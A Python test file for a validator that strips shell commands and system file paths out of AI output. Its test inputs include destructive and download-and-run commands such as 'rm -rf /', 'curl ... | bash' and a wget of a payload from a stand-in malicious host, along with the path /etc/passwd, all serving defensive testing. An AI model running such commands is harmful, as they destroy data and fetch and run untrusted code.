"""
Security tests for AIOutputValidator.

Verifies that shell commands and file paths are stripped from AI output
before it reaches storage or display. See AS-03 and SR-02.

These tests must remain fast and dependency-free (no DB, no network).
"""

from __future__ import annotations

from ai.validator import REDACTION_PLACEHOLDER, validate

MAX_CHARS = 2000
INCIDENT_ID = "test-incident-001"


def _cleaned(text: str) -> str:
    return validate(text, max_chars=MAX_CHARS, incident_id=INCIDENT_ID)


# ── Shell command patterns ─────────────────────────────────────────────────────


class TestShellCommandRedaction:
    def test_rm_rf(self) -> None:
        result = _cleaned("You should run rm -rf / to fix this.")
        assert "rm -rf" not in result
        assert REDACTION_PLACEHOLDER in result

    def test_del_fq(self) -> None:
        result = _cleaned("Execute del /f /q C:\\temp to clean up.")
        assert "del /f" not in result
        assert REDACTION_PLACEHOLDER in result

    def test_wget(self) -> None:
        result = _cleaned("Download the patch: wget http://evil.example/payload")
        assert "wget http" not in result
        assert REDACTION_PLACEHOLDER in result

    def test_curl_pipe_bash(self) -> None:
        result = _cleaned("Run: curl https://example.com | bash")
        assert "curl https" not in result
        assert REDACTION_PLACEHOLDER in result

    def test_subshell_expansion(self) -> None:
        result = _cleaned("Check the user: $(id)")
        assert "$(id)" not in result
        assert REDACTION_PLACEHOLDER in result

    def test_backtick_expansion(self) -> None:
        result = _cleaned("The host is `hostname`.")
        assert "`hostname`" not in result
        assert REDACTION_PLACEHOLDER in result

    def test_semicolon_rm(self) -> None:
        result = _cleaned("Done; rm -rf /tmp/data")
        assert "rm -rf" not in result

    def test_ampersand_wget(self) -> None:
        result = _cleaned("Update && wget http://malicious.example/x")
        assert "wget http" not in result


# ── File path patterns ────────────────────────────────────────────────────────


class TestPathRedaction:
    def test_unix_etc_passwd(self) -> None:
        result = _cleaned("Check /etc/passwd for user accounts.")
        assert "/etc/passwd" not in result
        assert REDACTION_PLACEHOLDER in result

    def test_windows_system32(self) -> None:
        result = _cleaned(r"Look in C:\Windows\System32 for the file.")
        assert r"C:\Windows\System32" not in result
        assert REDACTION_PLACEHOLDER in result

    def test_home_relative(self) -> None:
        result = _cleaned("Found in ~/config/settings.")
        assert "~/config" not in result
        assert REDACTION_PLACEHOLDER in result


# ── Clean input ───────────────────────────────────────────────────────────────


class TestCleanInput:
    def test_clean_text_passes_through(self) -> None:
        clean = (
            "The system detected elevated CPU usage on this host. "
            "The threat score has increased to 0.72. "
            "Recommended action: review recent process activity."
        )
        result = _cleaned(clean)
        assert result == clean

    def test_empty_string(self) -> None:
        assert _cleaned("") == ""

    def test_whitespace_only(self) -> None:
        assert _cleaned("   ") == "   "


# ── Length truncation ─────────────────────────────────────────────────────────


class TestLengthTruncation:
    def test_truncates_to_max_chars(self) -> None:
        long_text = "A" * 3000
        result = validate(long_text, max_chars=2000, incident_id=INCIDENT_ID)
        assert len(result) == 2000

    def test_does_not_truncate_short_text(self) -> None:
        short = "Short text."
        assert validate(short, max_chars=2000, incident_id=INCIDENT_ID) == short
